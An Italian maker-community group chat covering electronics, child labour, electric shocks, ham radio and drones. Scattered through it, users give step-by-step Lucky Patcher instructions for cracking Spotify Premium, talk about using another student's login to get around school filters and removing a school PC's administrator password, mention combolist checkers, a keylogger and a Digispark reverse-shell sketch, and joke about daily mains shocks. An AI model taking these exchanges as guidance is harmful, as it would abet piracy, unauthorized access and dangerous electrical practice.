Fuori i dati, dimmi dove se ad una compagnia/azienda/fabbrica viene data la possibilità di risparmiare questa non viene abusata
va che come esci dall'unione europea il resto degli stati non hanno una legislazione che regoli adeguatamente i reati legati allo sfruttamento dei minori, non devi per forza andare nelle filippine o in africa
Anche in unione europea eh
in unione una legge c'è almeno
Si, viene rispettata?
almeno...in italia siamo apposto, in ungheria già va un pelo vacillando
Anche in italia c'è lavoro minorile
Anche in Italia
beh si, ma non così tanto cribbio
E non è l'unico sfruttamento
Anche a me
Vatti a vedere le statistiche
Beh oddio essere mandati dai tuoi a lavorare a 14 anni perché servono soldi...
C'è una crack un po' vecchia che funziona ancora
*cof* alternanza scuola lavoro *cof cof *

Non con me 
Non funziona manco l'apk scaricato da apkmirror
Ecco
ok?
questo intendo
Un tizio ieri m'ha dato un punto di vista interessante sull'alternanza, ma ve lo dico dopo che altrimenti non vado più in doccia
E cosa sono? Percentuali, migliaia, milioni?
Percentuali, ma comunque non è poco
Che poi dire "in italia meno" è come dire "una sola cicca non fa male"
Ah ok
Quella che avevo non andava più, ma ne ho trovata una che va
si, ma in europa e in genere queste zone qua come l'ucraina e la russia si parla di poco a confronto con il resto del mondo
Ehi non faccio male io
Poi comincia la dipendenza da cicca e non esci più dai makers
Ecco ❤
Non sai che voglia di fare un salto a trento, sia per l'università sia per scassare un po' a te e romboli
in africa per ogni zona si ha tipo 3 volte quel che trovi in europa intesa come continente intero
l'anno prossimo andiamo a farci il tandem, 
Ok, allora smettiamo di preoccuparcene in italia visto che sono percentuali bassissime
Nel giro di 3 anni è raddoppiata
non...ho detto questo
Se mi dici che in italia è meno e che quindi è meglio è anche vero, ma ignora il problema e ti ritrovi il doppio dei ragazzi occupati
ovvio
Scassa scassa
Yay! 
 il prossimo drone lo spacco io
Vedi come salgono le views
l'anno prossimo veniamo li a fare il tandem come minimo
"In Italia siamo a posto"
Significa che non ce ne dobbiamo preoccupare no?
no, nel senso, apposto in confronto al resto del cristo di mondo, siamo messi molto meglio, e ciò è dato anche da qualcosa...
Allora apposto non era il verbo adatto
k
che fierezza, questo mi fa pensare ad un certo mediometraggio
hey, hey, tieni, tutta roba buona : 
Quando non hai la minima idea di come si installa un sistema operativo
TELL MI DE WEY
Era riferito a "io conosco come si fa" ma poi non ti funziona un cazzo
Qualcuno sa dirmi se si puó cambiare il layout con il cmd
installa il sistema operativo che gira da anni su telegram, fidati
non ci sperare
Apposto
Col CMD ho creato un keylogger potentissimo
uno di quelli che il C# invidia
non potete capire vuoi comuni ignavi
hai finito? ❤️
che anziché usare programmi che girano da anni su telegram (e ci sarà un motivo a ciò ) realizzata dei programmi..pfft!
❤️
la gente studiata può dare un'occhiata al mio codice in c++ sui socket e il multithreading che non trovo il/i bug?
continuerò a chiederlo fino a morte
no ora sono serio  sono consapevole del fatto che il c++ regge la maggior parte dell' intero sistema operativo Windows, ma nel 2018 vale la pena studiarlo?
Ragà Need Spotify
premium?
io lo studio a scuola e per me è uno dei migliori linguaggi che esistano quindi per favore sshh e non riapriamo una nuova guerra mondiale :D
Si
scrivimi in pvt
peggio degli spacciatori
shh non apriamo una nuova guerra civile 
beh non so voi ma per me qua parte una botta di affluenza verso soundcloud ora che spotify ha dichiarato guerra agli scrocconi
proprio ora che ho eliminato il mio profilo SoundCloud per passare su Spotify 
hehehe
vabbè, su spotofo mi sente di sicuro più gente lo stesso, quindi basta quello
Spero tu stia scherzando
?
Ahaha autocorrect
??
???
¿¿¿???
Forse 
 sicuramente ti può dare motivazioni più valide (oltre ad una marea di insulti) ma in realtà: 
Vuoi fare qualcosa di serio? 
- usi un linguaggio ad alto livello (python), i tempi di esecuzione si allungano
- usi un linguaggio a basso livello, ti ci vuole di più ma puoi tranquillamente eseguirlo in fretta
gente, per spotify hanno fatto già una patch su lucky patcher, di oggi stesso, bella
Pazienta, giovane padawan
By Pietro, fornitore ufficiale

eee non trovo più l'apk 
Morto
Passi l'apk di lucky patcher ?
wait, sto testando la patch
trovi facilmente online
Non ho voglia di cercare :c
Poi sinceramente a me il c++ e gli altri linguaggi a basso livello danno un maggiore senso di controllo
No 
ook...sembra che come previsto quella vecchia non abbai funzionato in nulla, quella nuova funzica in tutto invece, bella
Tra una marea di fake e virus?
REALIZZAZIONE SITI WEB STATICI
ci fai le calcolatrici ok?
lucky patcher official site
dici che non si accorgono? se si accorgono bloccano l'account eh
*fateci vedere
*speranze perse
Quello è un altro discorso, tu costruiresti una bici a partire da granello di sabbia?
Bello, mi passi il link?
<h1>ciao </h1>
<h1>come va?</h1>
troppo grande per me
Che cazzo, due header dello stesso tipo
Io mi sono innamorato del boostrap 4
magari fossi hacker industriale come me se seguissi i miei consigli..
emmh..no, h1, h2, h3, h4, h5 e h6 servono per segnalare la formattazione
Oh porco il lama
Giulian per favore mi mandi Lucky patcher ?
wait, sto testando ancora
E come fai a sapere sia l'officiale?
Perché è sempre aggiornata e va
Ahah per questi motivi io mi sono beccato un magisk infettato ❤️
no davvero è questa. e altri siti come apkhere od apkpure prendono l' apk sempre da sto sito
mmhh..boh..non mi lascia accedere con spotify moddato
Ovviamente non aggiungendo qualche porcata no?
no, sei tu che a causa della tua maniacità ti becchi i virus, ignora e verrai ripagato :D
nope
No parte scherzi quello è quello che ho anche io
Farò finta sia una battuta e risponderò con una risata sottomessa
e non trovo più l'apk di lucky patcher però..
saad
è un sito https cazzo!!
h t t p s !
eeh sai quanto ci vuole a farne uno 
 ho scaricato Lucky patcher... Come aplicco la patch ?
si ma il certificato è di comodo, è tipo una garanzia per "non vendiamo virus aggratis" almeno da quel che sto vedendo
VIDEO GUIDA PLS
Noi di criticalexception e geekswiki ne sappiamo qualcosa
premi su spotify, menu delle patch, la selezioni fai creare l'apk, disinstalli spotify dal telefono, torni su lucky patcher e premi installa
Ok
Patch specifica ?
boh
Che clicco ?
Tre tasti in alto a destra -> scarica patch specifica prima
il secondo dall'alto
Prima deve scaricarle
Grazie
si come premi patch specifica le scarica ho visto
quello aggiornato è diverso però
Non hai le patch specifiche?
nope... l'ho appena aggiornato, prima ce le avevo
Ma va con Lucky patcher?
Io avevo provato e non loggava
O c'è un qualcos'altro da fare apparte che la patch specifica?
Neanche a me logga
no non logga, il fatto è che non va con alcuna cpu che non sia armv7
vabò dai, contando che già hanno risolto per armv7 penso che facciano presto anche con il resto...
e ciò mi fa capire ancor più quanto sia una guerra persa in partenza quella di spotify ._.
XD
vabb, aspetta tipo altri 3 giorni e stai sicuro che già c'è la soluzione che ti serve...
Uhm... Però mo sto in hospital e non so che fare rip
Sbagliato
La patch è vecchia
Aspe ma tu sei vivo
È per spotify da 8.4.36 a 8.4.38, quella del grande ban è la 8.4.44
si, me ne sono accorto
Si mi sono risvegliato verso le 5
Ieri non avevo capito un cazzo e sembrava tanto un discorso "non ci sentiremo più per il resto della vita"
è l'aggiornamento della lista risalente ad oggi, sisi, beh non ci metteranno molto tempo a farne una nuova comunque
Non c'è modo di salvarsi finché l'unica versione che funziona è l'ultima
Bè considerando che mi hanno operato in provincia di Campobasso in Molise al cuore...
Ho rischiato 
Vabbè ora stai parlando
Si son vivo
Quindi è andato tutto bene teoricamente
Si
Quindi :)
Tra una settimana dovrei tornare a casa
Bene
Il mio cuore ora funziona bene :D
❤
Yea questo vuol dire che non svenirò più a caso
E che potrò ricominciare a fare sport
:D
Intanto torna a casa ❤️
Potrò riusare la barca a vela :D
potrai ridarti la 220 ogni volta che vorrai :DD
Ah che allegria
Comunque quanto cazzo fa male la 220
Eh ora la 220 volt invece di rianimarmi mi ammazza:D
tipo io ogni sera quando stacco la spina al pc, ho la spina che è incastratissima e quindi
Vabbè piccola scossetina prima di dormire
tranqui, ormai il mio braccio ci è abituato, le prime volte fa male però
Io l'avevo presa una volta tipo toccando un condensatore, è una sensazione troppo incredibile
c'è...male....oddio, non fa male, semplicemente hai tutti i muscoli del braccio tesissimi per un paio di secondi e poi ti riprendi subito
Non sono sicuro che fosse 220 però la scossa era forte
e ti senti il braccio stanchissimo
E sudi freddo
Io ho preso una scarica da un defibrillatore quindi...
:D
Chissà quanti volt sono
con l'esperienza non più, chiedi a electroboom
Credo tanti
Vabbè lui oramai è un voltmetro
o meglio "al brutto signore turkmeno/afghano" cit. romboli nell'ultima live
O un cercafase a seconda delle situazioni
Hahahahahahahaha
5000 V
è variabile li in teoria, comunque si, su quei voltaggi li, magari non è proprio la 220 altrimenti ti darebbero direttamente una forchetta in mano e ti lascerebbero fare a te ma insomma...siamo li ecco
Oh cazzo
si ma guarda l'amperaggio, sarà bassissimo
Si presumo
Il mio cuoricino:c
è come dire che i taser vanno a 50000V, ma non uccidono
non cambia, hanno un amperaggio bassissimo e quindi
E pensa che ero semi-cosciente quando lo hanno usato
Vedi? Più veloce così xD Ciao a tutti
Ciao
Haha benvenuto
beh...io mi do la 220 giornalmente quindi, capirai, dormo meglio almeno
Non fu una bella esperienza... È successo una settimana fa... Ho iniziato a sentirmi male , sono andato in ospedale ed ho avuto una fibrillazione
5000V = overVolt 
Comunque l'amperaggio dipende da un sacco di fattori e dalla gravità della situazione e non è indicato
Si comunque è talmente breve che non fa in tempo a danneggiare niente
Se era di un microonde ci sta molto di più
Overvolt salva la vita a milioni di persone al giorno 
Come al led del TV-b-gone che non abbiamo messo la resistenza
30ms bastano per la 220 a 50hz
Mica è alternata quella del defibrillatore
Povero spinotto...e povera mano destra
Ah si beh, dell'alternata tanto conta il Vrms
Si ma cambiarlo?🤷‍♂
Up 
Naah
Overvolt saved my life
L’amperaggio non è mortale
Seeh
Se prendi la 10A
O almeno quello che si dice in laboratorio
Puoi tenere 2 fili su cui scorrono 200A a basso voltaggio e non ti fai nulla
A causa della resistenza del corpo
Vedi electroBoom
Allora boh🤷‍♂
 tu che sei studiato dicci il perche
Ogni tensione a ogni corrente ha il suo tempo limite... E buona parte del danno la fa il fatto che è alternata
Il danno maggiore che fa la corrente di casa è il fatto che manda in tilt il cuore
Fa morire dal ridere
Ecco Roberto ha una risposta a tutto
Già.....ma ma se hai 50000V voglio vedere se l'amperaggio non fa differenza, mai provato a prendere una matita e attaccarla a 100V e alzare l'amperaggio? Spoiler : diventa una cazzo di lampadina
Dipende dove ti prendono..
Cioè io voglio assumerti come Wikipedia personale
Si ma di per se l’amperaggio non fa nulla
Nah, possono prenderti un po' ovunque non ci muori
Crea danno se combinato con l’alta tensione
La corrente è quella che fa danni a livello neuronale, pochi mA bastano per friggere tutto. Solo che il nostro corpo è una reistenza (o meglio, un impedenza) e quindi la corrente che scorre varia in base alla tensione. Comunque le tensioni massime "di sicurezza" sono 20Vac e 35Vcc se non ricordo male
Si ovvio
Comunque io non ho capito Jan cosa... Il defibrillatore eccita il miocardio?
Oppure agisce a livello di nervi ?
O funziona ad energia oscura?
Ma da quanto si inizia a percepire la “scossa”?
E poi ci sono io che quando non ho uno stagnatore potrei usare due cavetti uscenti dalla 220 per stagnare
Si, ma è molto pericoloso, non hai il controllo sulla temperatura e rischi di disfare tutto
Molto di più in V
In continua più alto dell'alternata e comunque dipende anche da tanti fattori tipo l'umidità e l'amperaggio
E si potrebbe prendere una scossa
L'amperaggio no. Che tu abbia 50Vcc 500mA o 500A, cambia solo il danno che fa, la scossa la becchi comunque
Mmhh..ok
"Pericoloso"
E comunque come nel primo messaggio, la legge di ohm vale anche con il nostro corpo
Sisi
Che operazione era? Brutta cosa, in bocca al lupo per la guarigione
L'ho presa più di una volta... 30ms mi sembrano pochi
Entra in gioco anche il tempo di esposizione alla corrente
La ho fatta stamattina... Praticamente dovevano tagliare un nervo...
Il classico grafico delle normative
30ms 
È il tempo con cui si tarano gli interruttori differenziali perché al di sopra puoi avere danni a seconda ad esempio di corrente ecc
È brutta la riabilitazione, ma i chilurghi sono bravi, forza rimettiti
Io non ho capito una cosa... Quindi quella scarica a 5000 volt eccita il muscolo e basta?
Approposito avrebbe dovuto saltare il salvavita ora che ci penso 🤔
Ok urge controllarlo
Hai preso la corrente oggi?
Grazie
Tutto sta nella corrente
Nono oggi no
Ma poi ho il pavimento in laminato che mi isola, adesso
differenziale, controlla che sia funzionante, montato correttamente e dimensionato nel modo corretto per casa tua
Tutti i differenziali in commercio devono scattare per qualunque valore di corrente sopra i 30mA e entro 30ms
Conoscendo l'impianto elettrico di sta casa ci saranno dentro un paio di criceti che sono addestrati ad abbassare la leva quando sentono odore di umano bruciato
La corrente di scatto è 30ma
mi sembrava che avessero valori di mA differenti a seconda di quanti kW ci passano, ma potrei sbagliarmi
Sì sorry
Typo
AHAHAHAHAHAHA
Dipende se non sei in una casa vecchia e lo hai  a 300ma perché ci sono troppe dispersioni
Ragà io vado a letto... É stata una giornata pesante... Buonanotte
Nottee
valori differenti di risposta in ms sono per una maggiore sezionabilita del impianto...es divisione valle e monte..(per dare priorità)
che poi un buon differenziale riduce di molto (per non dire che li elimina tutti) i disturbi provenienti da monte del circuito
Scusate ragazzi, ma non riesco a compilare la Rubber
Dckuino mi passa un errore
Ancora?
Spotify di nuovo gratis✌
Wtf
Proprio oggi che l'ho comprato con il bonus di renzi
E l'esp ti compila?
Noi prima esperienza di laboratorio due, ci hanno fatto testare gli interruttori differenziali
wtf?
Wtf, perchè potete comprarlo con i soldi di renzi?
A Furia di bestemmie con esp ho risolto
Con una resistenza? Su cui cadeva più di 30 ma?
Sparano cazzate
Si
Allora ne hai tirate ancora poche compilazione a bestemmia
Mi pareva
cortocircuitando il circuito brutalmente 
Ma non è vero, non è giusto
Ma porca..... 🤦‍♂️
 mastro Linux posso farti una domanda?
Con una scatola decade, controllando il funzionamento e il tempo di apertura eventuale tra i 10ohm e i 9MOhm
Spara
Tu hai DigiSpark?
Infami
Fake o per davvero?
Nope
Dimmi
Davvero davvero
Aspettatemi tra 4 anni
Grazie comunque
Non riesco a mettere i driver su linux
Dio 
Di cosa?
DigiSpark
Che nervi, io non potevo fare nessun abbonamento
Perchè servono driver? Aggiornatemiii
Non vede la porta, quindi....
Hai utilizzato la guida di Digistump?
Si, ed ecco l'errore.....
Manca la libreria usb.h
Che installo....?
Io lo usavo
Non mi dava problemi
Ma con linux?
Si
Pero kali no parrot, pero e sempre linux.. quindiii
Hai letto le troubleshooting?
No
Da dove?
Che hai fatto scusa? Io ho  installato Arduino, trovato il codice, convertito, aggiunto la scheda
Ho installato l'ide di arduino caricato lo scheth che faceva la reverse shell su linux e funziona perfettamente perchè?
E niente, piccola gag completamente a caso del vecchio MK, che ogni volta mi pronunciava "óverVolt" 
overVoltÒfficial
Ormai MK l'ho perso, prima faceva le serie tecniche quelle cicciotte che ora non fa più :'(
Si mi sa che alla fine ha capito così hahah
La nuova awakening... purtroppo farma troppo offcamera e in puntata ha molta roba già fatta, e in più fa gli episodi ormai da 50m
Marco seraaa
Un apostrofo nel nome 
Ziiii
Sei fake, quello vero si chiama Lorso Pippo 
🤣
Io l'ho comprato ed è abbastanza figo
Ma
Ma anche gli escrementi si colorano?
Zitto che non sei il vero Marco
Giusto la notte per non fare come me che non ho msi voglia di accendere la luce
Sorry, avevo letto un messaggio per un altro
Ma gli angoli dei mobili bisogna evitarli zio, altrimenti rischi di svegliare tutto il vicinato
La ozone 2 kappa mode te la sei sparata? quella era old style
Ovvio, anche l'Immersive Craft, ma dopo che ha iniziato a fare serie non tecniche l'ho abbandonato
immersive schifo: corta, insignificante e tutta offcamera
Offcamera non troppo, corta sì

basta guardare Marco che fissa le nuove fotocamere appena presentate 
For me?
Almeno tu hai segni di vita

Ma il senso?
Di notte come centri il buco?
Si chiama luce
Lol
 intensifies
voglio la maglietta io però
nnaccia
dovevo leggerle prima

"Giochiamo a nascondino"
*conta fino a 30 minuti*
Tra poco ammazzo quelli i Fedex
Raga
Mi serve una mano
Spara
Guarda te ne do 2 🤲
Sto seguendo quella guida di overvolt per la pass di amministratore
Però a me da questo messaggio che nella guida non dice cosa devo mettere
Annulla, non vuoi ripristinare il computer
Grazie
I tracking quelli belli
A me hanno spedito (fedex priority) il 7, e mi porta ancora che non è partita
Prime? 
Cosa?
La spedizione... Amazon Prime?
Nono, hobbyking
Eeeh allora
Eh 80€ di spedizione 
Ah 
Miinchia che hai preso? 
Gli hai comprato il negozio?
Si comunque HK vai tranquillo che ce la impiega la sua buona settimana
Circa 8000mAh di lipo, 1kg di abs verde, una stampante 3d e 2 kit arfuino
Ragazzi scusate ma qualcuno ha qualche libro per i rudimenti dell'elettrotecnica? Su makerbook sono tutti da università e non sono ancora a quei livelli
Spero per venerdì prossimo
Ah ok allora ci sta... Soprattutto con la stampante sarai arrivato sopra la decina di kg
Fedex mi dice 7kg ma non credo 
È una stampante 3d casa delle bambole
Chissà che botta di dogana
FERMATE TUTTO FINIAMO IN OVERFLOW
(nel frattempo abbiamo raggiunto i 
 RISPARMIATORI OVERVOLTICI in questo gruppo  grazie a tutti dell'interesse e del supporto)
Eh.. sui 30/40
Dall'11 al 14 aprile qua a Trento (che culo ) ci saranno i campionati nazionali Robocup per le solite tre categorie di robotica della Robocup Jr. (line, maze, soccer)
È una gara importante perché i vincitori potranno andare ai mondiali 2018 di Montreal... Ma non sono qui a fare pubblicità, anche perché penso che le iscrizioni siano già chiuse.
Comunque se con la vostra scuola partecipate (o se sarete qua come spettatori) mi beccate sicuramente in giro, soprattutto il giorno della finale     
 🤔Marco perchè non fai qualche clip dell'evento? oppure una diretta/live
Sigh, hopper

Pensare che 
 lo ho conosciuto per questo 
Veroh, al calcio ⚽
Il peggior giorno della mia vita ❤
A scuola abbiamo una Wi-Fi che possiamo usare liberamente accedendo con delle credenziali poi dal Browser. In questa connessione ci sono filtri e ti controllano il traffico. Se io utilizzo una Vpn posso aggirare questi problemi
Pensa che senza robocup non sarebbe nato nemmeno overvolt
Verissimo
Yes
A proposito 
Dica
Qua dicevi di cosi precisi
ma dai che sotto sotto lo ami, ammettilo
Ovvio
Ma come sono strutturati?

Bene 
Oscillatore a ponte di wien
🤔 anche se è un piromane perchè utilizza delle cassette di legno per montare circuiti elettrici altamente dissipanti?
Proprio per quello
Thx, ci do un'occhiata 
Stai preparando la tesi? 
 🤔🤔🤔🤔 volendo potresti fare uno speciale Arduino Sensori, così da far vedere come possono essere integrati in un robot
Questo è uno dei due calciatori con cui all'epoca avevo partecipato, che ricordi 
❤️hai ragione, nella buona e nella cattiva sorte❤️ bravo cicca

Fa piacere ricevere questo:

Please allow me to share my top long distance QSO on 23cm band.On sunday during the March contest we completing a contact with IQ1KW op Dario Bellocchio.Distance 981km mode aeroplane scatter.It was incredible to hear him from such a distance.Thank you Dario for your patience.I know your side was the key to success and I'm happy to be part of this.My station IC-910h>PA 60Watts>27m 7/8"> 150cm mesh dish.The antenna 190m ASL with clear takeoff 73 Laci HA5UA
In pratica è un oscillatore con doppia retroazione che si autostabilizza, la frequenza la si regola dimensionando correttamente la retroazione sul ramo in cui compare la rete R-C (che è quella che si occupa di sfasare il segnale in uscita innescando l'oscillazione) quindi la precisione della frequenza di oscillazione dipende solo dalla qualità dei componenti esterni usati. Forse riesco pure a recuperare un pdf che spiega tutto in modo migliore
Sessanta watt 
spiegazione al limite del porno
Addirittura in aeroscatter  wow
Beh... noi 600w
Le soddisfazioni di sperimentare in ambito ham
Se passava un piccione davanti all'antenna avevate la cena pronta 
Me li sono studiati l'anno scorso durante le ore di elettronica laboratorio visto che mi annoiavo ad utilizzare gli opamp cone semplici amlificatori o filtri di I ordine

Già arrosto, bastava solo prenderlo al volo che non si sporcasse 
Hahahaha
Spiumarlo manco
Che poi il limite non dovrebbe essere 500W?
Sisi, 500 mi sono sbagliato
Comunque come pochi sanno, a differenza di cellulari, radio commerciali e tv, le radio ham pur avendo grosse potenze in antenna sono veramente poco dannose vista la % del tempo in cui si trasmette
 500W di finale, su antenna con guadagno 5, quindi 2,5kW emessi xD
Così come nessuna auto fa più dei 130 km/h, limitemax in autostrada

Antenna guadagna un po di più.
4 metri parabola
Circa 20 dB
Dio... Allora altro che 2.5kW emessi 
A proposito di polli arrosto, l'anno scorso un passerotto la fatto il nido nell' illuminatore della parabola
Povero piccolo
Fortuna che sembrava abbandonato il nido, ho comunque dovuto spostarlo
Anche il blocco ?
"Chi non è commosso dall'amplificatore differenziale, non ha poesia nell'anima"


Le vpn le usiamo anche noi in uni per bypassare i blocchi
Gli opamp sono uno dei migliori componenti elettronici esistenti, si avvicinano all'ideale come nessun'altro componente fa
Ok
Nono ma che opamp
E poi sono multi funzione come poco altro. Il mio ex prof di laboratorio delle superiori sotto naia faceva manutenzione ai sistemi di puntamento automatico di lanciamissili: tutta la logica fatta a transistor e operazionali (non esistevano ancora processori digitali)
Quale blocco aspe?
ad alcuni siti
Allora dipende dal blocco
Con le vpn puoi usare anche protocolli e servizi bloccati
Sicuro?
In uni facciamo cosí
La vpn ti "camuffa"
Inoltra le tue richieste
Il fatto che ci sia un'autenticazione poi via Browser non influisce ?
Cosa ti chiede l'autenticazione?
Credenziali private per ogni studente
Tipo?
L'autenticazione la devi fare sempre e comunque
la vpn semplicemente è un server che usi per navigare, tu parli con quel server e quel server parla per conto tuo con il sito che vuoi visitare
Esatto
Nome: Pippo
Password:qwerty
Allora ti sgamano comunque
Sanno che a quell'ip ci sei tu
Anche se lo cambi
No, vedono solo richieste al server vpn
Si ma dal suo account
ah, vero, non ha molto senso usare una vpn per accedere a profili in cui sei identificato nella realtà
Quindi comunque lo stamani
ma il blocco si disattiva ?
Sgamano
No
E quindi? Non possono sapere cosa chiedi al server vpn

Certo che possono
Perché il server poi lo chiede a loro
^
La vpn inoltra le tue richieste
... Ti autentichi senza vpn, la vpn la usi per accede all'esterno della rete ...
Accedere all'esterno della rete (?)
Quind mi autentico senza e poi attivo la Vpn ?
esattamente, a cosa ti serve la vpn nel tuo caso?
Leggi
Per bypassare siti bloccati
Ma la vpn non fa questo
per aggirare dei limiti regionali dati da alcuni servizi?
Inutile comunque
aggirare un blocco di alcuni siti e non far vedere che faccio con internet
per quelli basta un dns
E la rete che li blocca proprio
Quindi non penso cambi qualcosa
ahhh ok, allora la può usare anche con i servizi che lo identificano nella realtà, tanto gli serve solo per bypassare i blocchi della sua rete scolastica/universitaria/del capus/etc
Eh ma loro gli hanno detto che la vpn gli permette di bypassare i blocchi
Ma non è vero
non la userà per rendersi anonimo 
La vpn non è dio
magari i blocchi del firewall
Esatto
In poche parole è inutile la vpn se sanno che sei tu
Concludendo. Posso passare i blocch ma mi tracciano comunque ?
Si
Incaso mi loggo come altro studente
Tranne che prendi nome utente e password di qualcun'altro
Esatto
Ma in questo caso la vpn ti serve
O sanno che sei stato tu perché hanno il tuo ip
se usi la vpn per accedere ad un servizio in cui ti sei registrato inserendo i tuoi dati, si. ma anche se a quel servizio accedi normalmente con il tuo ip
Ma la cosa principale è: li sai bypassare i blocchi?
però non stai facendo niente di illegale, quindi frega poco se sanno chi sei 
No ?
Eh
ma quali blocchi? 
Quindi senza quello non fai niente
tipo che non puoi andare su youtube o scaricare video?
Non lo fa la Vpn ?
No
È questo che sto cercando di spiegare
.
esatto
Eh ma quello non credo tu possa modificarlo
Tranne che riesci ad avere dei permessi particolari
magari una vpn che va sulla porta del browser può andare bene
Nope
Comunque la blocca
La vpn è tipo un altro dispositivo
Che tu gli dici cerca questo è mandami i risultati
Ma quel dispositivo non ha comunque i permessi
io parlo di questa cosetta qui 
Si ma frega un cazzo se non può bypassare il blocco
Nope
Non accetta la richiesta il router
È un blocco e basta
Se non hai i permessi non fai niente
Eh
Le richieste per quei determinati siti non te le accetta
I serve vpn richiedono i siti
E li bloccano
Non è che le vpn hanno il potere universale..
Secondo me, è fedex che ancora non ha aggiornato il tracking code
Sennò non si spiega
Si ma i server vpn chiedono al router quello che hai chiesto tu ma sono semplici utenti come te e quindi non bypassi niente
Si
Nope
Allora tu navigheresti gratis
Ottimo sticker
 posso mandarti 2 file in pvt con spegati diversi oscillatori fatti con opamp che spiegano bene anche come funzionano e come dimensionare i componenti
Ma alla fine la richiesta arriva al router
Mmm
Quindi tu dici che la Wi-Fi o i tuoi dati li usi per mandare le richieste alla vpn che poi tramite il suo router ti rimanda la risposta?
Ah okok perfetto
Ho capito
Non ci arrivavo ti giuro ahahah
Come togliere la password amministratore su Windows della scuola
Che non ricordo
Sanno che lo hai fatto con il computer della tua classe
Non mi vanno
Quindi i tuoi compagni per non prendersi la nota ti denunciano anche la casa
Ne hai qualcuno funzionante?
Solo per una installazione mi serbe
Oppure scollegare il pc dal server della scuola?
I pc sono tutti collegati tra loro
Non so come spiegartelo
ma quanto è fastidio scrivere con le penne a  gel se si è mancini, ho appena finito un tema e sembra che abbia squartato una seppia
lo so ma avevo solo quella sta mattinanquando lho messa nell'astuccio non me n'ero accorto
Vai! grazie 
Marco una domanda
Riguardo alla rubber ducky
Ma lo stesso procedimento si può fare con qualche programma di scrittura, eseguibile come programma e non arduino?
DIfficile: la tastiera deve essere un dispositivo hardware
Va bene grazie
puoi usare le macro di excel se ho capito bene ciò che vuoi fare
Ovvero?
e niente, salve gente
Cerca in rete l ' Handbook di Nuova Elettronica
Buongiorno gente. Sono nuovo e ho iniziato da poco la mia avventura sui droni....ho iniziato a costruire un f450 in stile overvolt... vorrei modificare il firmware simonk degli esc con il firmware di bheli....come posso trovare la piedinatura per poter leggere il chip dell'atmel?
allq campana del vetro c'è sempre roba buona
detto, fatto
hai più culo che anima  ma che cazzo
è il 21 oppure il 24 pollici?
Hp Pavion 24 se non ho visto male
 porco mondo, 130€ di monitor..se non è culo questo funziona?
Ragazzi qualcuno ha un TFT da 7" con SSD1963 da vendere?
Dopo lo provo ...non c'è l'alimentatore suo..quidi lo provo con quello da banco
serious? pensavo foste compagni di classe dalle superiori 
vabbè, se funziona, l'alimentatore è una cazzata da trovare..che attacco ha?
Ma per fare un nuovo account telegram devo inserire un altro numero?
Un jack piccolo...simile a quelli tradizionali a banana...non ricordo il loro vero nome
allora va bene anche un alimentatore multiplo con adattatori 🤔 quanto porta di assorbimento? ci dovrebbe essere la targhetta dietro
c'è il tutorial sul blog 
 ❤️
 🤔questo è un articolo interessante
Eh nono lui è più vecchio
2,4 A 19V
Lo dovrei avere da qualche parte...
rafa se in c# faccio 0,125%2 mi da output 0 ? cioè, lo considera pari o dispari
un classico caricabatterie da notebook dovrebbe andare bene..vendono quelli settabili
Esatto
Ciao ragazzi come faccio a creare l'apk per Spotify da Lucky patcher?
Cioè quale di queste opzioni?
Prima di tutto devi scaricare l'applicazione dal Play Store, poi la devi aprire, Impostazioni, Piano mensile e pagareh
non funziona
Lol
io proporrei di utilizzare i programmi che girano da anno su telegram
combolist-checker
almeno in questo caso servono
Attenti che se Spotify vi becca vi banna l'IMEI del telefono
ragazzi una domanda: è mai capitato a qualcuno che su un ordine amazon contenente 2 articoli ordinati nello stesso momento, spediti entrambi da amazon e con la consegna nello stesso giorno, ne arrivi uno solo? mi spiego: ho ordinato la tavoletta grafica + il supporto da tavolo a vite, ma mi è arrivata soltanto la tavoletta grafica..sul sito Amazon mi compare un ordine unico con un unico codice di tracciamento.. possibile che il supporto arrivi con un altro corriere, anche se è stato ordinato in contemporanea con la tavoletta? il pacchetto era sigillato, consegnato dal postino..qualcuno mi sa dire se sia possibile?
anche l' id e l' indirizzo mac mi han riferito..
minchia che nazisti
Se il tracking è uno...
Stica**
è mai possibile che non l'abbiano spedito? mi sembra troppo assurdo per gli standard Amazon
Oppure esiste un altro modo per truffare Spotify e pagare 2,5€ a capoccia
Cof** Together Price coff**
Uno crea un profilo famiglia (che si dovrebbe poter utilizzare solo con persone residenti allo stesso indirizzo) che costa 15€ al mese e ti da 6 account
Ti inventi nomi random di persone che vivono a casa tua e chi ti sgama più
Fanno bene
Se violi la loro EULA hanno tutto il diritto di farlo
Poi boh penso che se logghi con un account premium vada lo stesso
Ti banneranno solo dall'usare gli account gratuiti
ah vabbè, a me non cambia nulla, non lo uso e non l'ho mai usato 
e se io compro un telefono usato, non è giusto che il mio telefono sia bloccato per colpa di qualcun'altro
Spotify è una droga a tutti gli effetti
Una volta che lo provi non puoi più smettere
Quando senti la musica dei rilassato
E se non la senti per un giorno diventi nervoso
Wait... Non eri a Bologna?
Lol ho fatto la visita dal cardiologo in Molise
Perché mia zia lavora all'ospedale la
*Bologna
Mi sto confondendo pure io lol
Buonasera, forse potete aiutarmi..
Sto cercando di capire se il mio PC fa la deframmentazione del file di boot in automatico (cioè se è pianificata). Sapete dove lo posso vedere?
Sottolineo del file di boot, non del disco..
Ho trovato una guida che mi fa andare nel registro di sistema ma è relativo a Win7, io ho Win 10 e mi manca la sua voce "Enable" nella cartella Dfrg
Dipende anche dalla scarica, non è una corrente sempre costante come la 220V a casa tua, è la scarica di un condensatore
Cioè dovrebbe esser qui ma non c'è..o non lo vedo..
ho risolto tramite assistenza, mi hanno fatto il rimborso..praticamente si sono dimenticati di spedire il supporto, essendo un venditore esterno che spedisce tramite amazon
Questo é vero
Hahhaha non ho visto l'enorme crepa da spento....
 comunque era il modello a 22 pollici
Cavolo è successo?
magari si trova il pannello a relativamente pocoq
io ci sono a fare l'arbitro 
Raga c'è un modo per scaricare Musica da Youtube evitando i vari convertitori(cioè in modo fai da te)?
in che senso
Hai in mente che copi l'URL del video e lo inserisci nel convertitore?
Vorrei un convertitore fai da te insomma
ci sono degli add-on/plug on per pc
mentre sul cell io ho un app che è youtube modifiato e oltre a poter scaricare i video e musica fa anche ascoltare in background
È una poverata lo facevo anche io una volta.
volevo trovare il modo di elaborare l'URL del video senza passare dai convertitori
L'hai moddato tu?
no lho trovato su internet
ogyoutube si chiama
L'ho trovato nulla campana del vetro
Che fortuna
Quello lo ripari facilmente
Ma solo io penso che quell'arma sia il lancia granate di GTA 5?
Ne ho già 8 di monitor che no uso...non so più dove metterli
Ne hai due/tre dello stesso modello?
Si ho una coppia
Io resto sono diversi
Che qualità sono quelli uguali ?
